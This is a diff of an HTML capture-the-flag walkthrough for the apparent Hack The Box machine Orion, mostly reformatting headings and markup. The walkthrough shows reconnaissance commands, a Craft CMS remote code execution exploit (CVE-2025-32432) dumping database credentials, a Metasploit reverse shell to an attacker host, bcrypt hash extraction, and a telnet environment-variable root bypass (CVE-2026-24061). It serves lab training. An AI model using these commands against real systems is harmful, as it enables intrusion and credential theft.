@@ -38,16 +38,15 @@
 </head>
 <body>
 <div class="container">
-
-    <h1>🚀 HTB Orion - Complete Walkthrough</h1>
-
     <div class="meta-info">
         <span><strong>Machine:</strong> Orion</span>
-        <span><strong>Difficulty:</strong> 🟢 Easy</span>
-        <span><strong>OS:</strong> 🐧 Linux</span>
+        <span><strong>Difficulty:</strong> Easy</span>
+        <span><strong>OS:</strong> Linux</span>
         <span><strong>Domain:</strong> orion.htb</span>
         <span><strong>Tech Stack:</strong> nginx, Craft CMS 5.6.16, MySQL, GNU inetutils telnet</span>
     </div>
+
+    <h1>🚀 HTB Orion - Complete Walkthrough</h1>
 
     <h2>📋 Attack Chain Overview</h2>
     <div class="attack-chain">
@@ -66,7 +65,7 @@
     <pre><code>nmap -sS -p- --min-rate 5000 -n -Pn $TARGET -oN silent
 nmap -sVC -p22,80 $TARGET -oN service</code></pre>
 
-    <h4>Key Findings:</h4>
+    <p>Key Findings:</p>
     <table>
         <tr><th>Port</th><th>Service</th><th>Details</th></tr>
         <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 8.9p1</td></tr>
@@ -79,13 +78,14 @@ nmap -sVC -p22,80 $TARGET -oN service</code></pre>
     <h3>Web Fuzzing</h3>
     <pre><code>gobuster dir -u http://orion.htb -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt</code></pre>
 
-    <h4>Key Findings:</h4>
+    <p>Key Findings:</p>
     <ul>
         <li><code>/admin</code> → Craft CMS 5.6.16</li>
         <li><code>/api</code> → Yii Framework/2.0.51</li>
     </ul>
 
     <h2>🎯 Craft CMS RCE — CVE-2025-32432</h2>
+
     <p><span class="cve-tag">CVE-2025-32432</span> Unauthenticated RCE</p>
 
     <h3>Check Vulnerability</h3>
@@ -94,6 +94,7 @@ nmap -sVC -p22,80 $TARGET -oN service</code></pre>
 
     <h3>RCE to Dump Config</h3>
     <pre><code>python3 craftcms_final_payload.py -u http://orion.htb -c "env"</code></pre>
+
     <div class="box success">
         <pre><code>CRAFT_DB_USER = root
 CRAFT_DB_PASSWORD = SuperSecureCraft123Pass!
@@ -109,6 +110,7 @@ set lhost <ATTACKER_IP>
 exploit</code></pre>
 
     <h2>🔑 Hash Extraction and Cracking</h2>
+
     <pre><code>mysql -u root -p'SuperSecureCraft123Pass!' -D orion
 select * from users;
 # adam@orion.htb | $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS</code></pre>
@@ -119,6 +121,7 @@ select * from users;
     </div>
 
     <h2>👑 Privilege Escalation — Telnet CVE-2026-24061</h2>
+
     <p><span class="cve-tag">CVE-2026-24061</span> GNU inetutils telnet 2.7</p>
 
     <h3>Discovery</h3>
@@ -126,23 +129,24 @@ select * from users;
 # tcp LISTEN 127.0.0.1:23</code></pre>
 
     <h3>Exploitation</h3>
-    <pre><code>env USER='-f root' telnet -a 127.0.0.1 23
-# uid=0(root) gid=0(root) groups=0(root)</code></pre>
+    <pre><code>env USER='-f root' telnet -a 127.0.0.1 23</code></pre>
+
+    <div class="box success">
+        <pre><code># uid=0(root) gid=0(root) groups=0(root)</code></pre>
+    </div>
 
     <h2>📊 Key Takeaways</h2>
     <ul>
-        <li><strong>Unauthenticated CMS RCEs are high-value</strong> — Check <code>/admin/login</code> version banners</li>
-        <li><strong>Internal port 23 raises alarms</strong> — Enumerate with <code>ss -tulpn</code></li>
-        <li><strong>Environment variable injection in telnet</strong> — CVE-2026-24061 creates trivial auth bypass</li>
-        <li><strong>Bcrypt hashes can be cracked</strong> — Always attempt cracking before moving on</li>
+        <li><strong>Unauthenticated CMS RCEs are high-value.</strong> Check <code>/admin/login</code> version banners.</li>
+        <li><strong>Internal port 23 raises alarms.</strong> Enumerate with <code>ss -tulpn</code>.</li>
+        <li><strong>Environment variable injection in telnet.</strong> CVE-2026-24061 creates a trivial auth bypass.</li>
+        <li><strong>Bcrypt hashes can be cracked.</strong> Always attempt cracking before moving on.</li>
     </ul>
 
     <div class="nav-buttons">
         <a href="/writeups.html" class="back"><i class="fas fa-arrow-left"></i> Back to Writeups</a>
     </div>
-
     <div class="footer">NIGHT PULSE X • 2026</div>
-
 </div>
 </body>
 </html>
